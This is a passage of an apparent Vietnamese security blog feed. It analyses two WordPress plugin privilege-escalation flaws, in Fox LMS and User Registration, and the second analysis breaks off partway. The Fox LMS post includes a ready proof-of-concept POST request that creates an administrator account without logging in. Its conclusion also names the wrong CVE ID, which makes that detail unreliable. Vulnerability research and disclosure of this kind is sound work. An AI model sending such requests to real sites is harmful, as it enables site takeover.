được lấy trực tiếp từ request, bao gồm:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;role&amp;#39;]),&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là kẻ tấn công chỉ cần gửi một request POST tới endpoint &lt;code&gt;/wp-json/fox-lms/v1/payments/create-order&lt;/code&gt; và truyền vào giá trị &lt;code&gt;role&lt;/code&gt; tùy ý (ví dụ: &lt;code&gt;administrator&lt;/code&gt;). Vì endpoint này &lt;strong&gt;không kiểm tra quyền truy cập&lt;/strong&gt; và hàm cũng &lt;strong&gt;không validate giá trị role&lt;/strong&gt;, tài khoản mới sẽ được tạo với quyền tương ứng.&lt;/p&gt;&#xA;&lt;p&gt;Kết quả là kẻ tấn công không cần đăng nhập vẫn có thể &lt;strong&gt;tạo tài khoản với quyền quản trị&lt;/strong&gt;, dẫn đến &lt;strong&gt;leo thang đặc quyền và chiếm quyền kiểm soát toàn bộ website&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;&lt;code&gt;v1.0.5.3&lt;/code&gt;&lt;/strong&gt; đã khắc phục lỗ hổng bằng cách &lt;strong&gt;hardcode giá trị &lt;code&gt;role&lt;/code&gt; thành &lt;code&gt;subscriber&lt;/code&gt;&lt;/strong&gt; khi tạo tài khoản người dùng mới, thay vì lấy trực tiếp từ dữ liệu request. Điều này giúp ngăn chặn việc kẻ tấn công truyền vào các giá trị role tùy ý để leo thang đặc quyền.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$userData = array(&#xA;    &amp;#39;first_name&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;first_name&amp;#39;]),&#xA;    &amp;#39;last_name&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;last_name&amp;#39;]),&#xA;    &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user($params[&amp;#39;username&amp;#39;]),&#xA;    &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email($params[&amp;#39;email&amp;#39;]),&#xA;    &amp;#39;user_pass&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;password&amp;#39;]),&#xA;    &amp;#39;role&amp;#39;       =&amp;gt; &amp;#39;subscriber&amp;#39;,&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-json/fox-lms/v1/payments/create-order&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Endpoint is publicly accessible (permission_callback = __return_true)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;createOrder() receives request parameters&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_parse_args() merges user input into params (role is not validated)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Attacker sets role=administrator in request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Course price is free (price &amp;lt;= 0)&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;User is not logged in → system creates new user&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;wp_insert_user() is called with attacker-controlled role&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;New user account is created with Administrator role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Gửi request tạo user:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/fox-lms/v1/payments/create-order HTTP/1.1&#xA;Host: localhost&#xA;&#xA;role=administrator&amp;amp;first_name=hacker&amp;amp;last_name=hacker&amp;amp;username=hacker&amp;amp;email=hacker@gmail.com&amp;amp;courseId=course_id&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-08-cve-2025-14156/result.png&#34; title=&#34;Thành công tạo user với role=administrator&#34; data-thumbnail=&#34;/posts/2026-01-08-cve-2025-14156/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Thành công tạo user với role=administrator&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-08-cve-2025-14156/result.png&#39; alt=&#34;Result&#34; height=&#34;530&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thành công tạo user với role=administrator&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Login với user vừa tạo.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-2563&lt;/strong&gt; xuất phát từ việc &lt;strong&gt;REST API được public không kiểm soát quyền truy cập&lt;/strong&gt; và &lt;strong&gt;tham số &lt;code&gt;role&lt;/code&gt; không được validate&lt;/strong&gt;, cho phép attacker chưa xác thực tạo tài khoản với quyền tùy ý, bao gồm &lt;strong&gt;Administrator&lt;/strong&gt;. Mặc dù công bố cho rằng đã vá ở &lt;code&gt;1.0.5.2&lt;/code&gt;, nhưng thực tế bản vá chỉ hoàn chỉnh từ &lt;strong&gt;&lt;code&gt;1.0.5.3&lt;/code&gt;&lt;/strong&gt; khi &lt;code&gt;role&lt;/code&gt; được hardcode về &lt;code&gt;subscriber&lt;/code&gt;. Người dùng cần cập nhật plugin và rà soát lại các tài khoản đã tồn tại.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không expose API nhạy cảm khi chưa kiểm soát quyền.&lt;/li&gt;&#xA;&lt;li&gt;Không tin tưởng dữ liệu từ client, đặc biệt là tham số phân quyền.&lt;/li&gt;&#xA;&lt;li&gt;Luôn validate và whitelist input.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra thực tế bản vá, không chỉ dựa vào thông báo.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fox-lms/vulnerability/wordpress-fox-lms-plugin-1-0-4-7-1-0-5-1-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Fox LMS Plugin 1.0.4.7-1.0.5.1 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/</link>
      <pubDate>Wed, 07 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WordPress &lt;strong&gt;User Registration &amp;amp; Membership&lt;/strong&gt; phiên bản &lt;strong&gt;trước 4.1.2&lt;/strong&gt; &lt;strong&gt;không ngăn chặn người dùng tự thiết lập vai trò tài khoản&lt;/strong&gt; khi &lt;strong&gt;Membership Addon được kích hoạt&lt;/strong&gt;, dẫn đến &lt;strong&gt;lỗ hổng leo thang đặc quyền&lt;/strong&gt; và cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; giành được &lt;strong&gt;quyền quản trị (admin)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;User Registration&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một loạt các action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong danh sách &lt;code&gt;$ajax_events&lt;/code&gt;, action &lt;strong&gt;&lt;code&gt;register_member&lt;/code&gt;&lt;/strong&gt; được đánh dấu &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;register_member&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là plugin đăng ký cả:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_register_member&#xA;wp_ajax_nopriv_user_registration_membership_register_member&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; → cho người dùng đã đăng nhập&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; → cho người dùng &lt;strong&gt;chưa đăng nhập (unauthenticated)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Vì vậy, &lt;strong&gt;bất kỳ ai cũng có thể gửi request tới endpoint này&lt;/strong&gt;, kể cả attacker chưa xác thực.&lt;/p&gt;&#xA;&lt;p&gt;Khi request được gửi đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=user_registration_membership_register_member&lt;/code&gt; thì callback &lt;code&gt;register_member&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_member() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; ); // nonce verification.&#xA;    if ( ! isset( $_POST[&amp;#39;members_data&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field members data is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $data = apply_filters( &amp;#39;user_registration_membership_before_register_member&amp;#39;, isset( $_POST[&amp;#39;members_data&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true ) : array() );&#xA;&#xA;    if ( ! isset( $data[&amp;#39;username&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field username is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $membership_service      = new MembershipService();&#xA;    $response                = $membership_service-&amp;gt;create_membership_order_and_subscription( $data );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;register_member()&lt;/code&gt; thực hiện kiểm tra &lt;strong&gt;nonce&lt;/strong&gt; bằng cách gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi tìm kiếm với từ khóa &lt;code&gt;ur_members_frontend&lt;/code&gt;, có thể thấy &lt;strong&gt;nonce được tạo với key &lt;code&gt;_nonce&lt;/code&gt;&lt;/strong&gt; thuộc đối tượng &lt;strong&gt;&lt;code&gt;ur_membership_frontend_localized_data&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;708&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Key và value này được thêm vào &lt;strong&gt;response khi truy cập endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#39; alt=&#34;Value&#34; height=&#34;565&#34; width=&#34;1558&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p 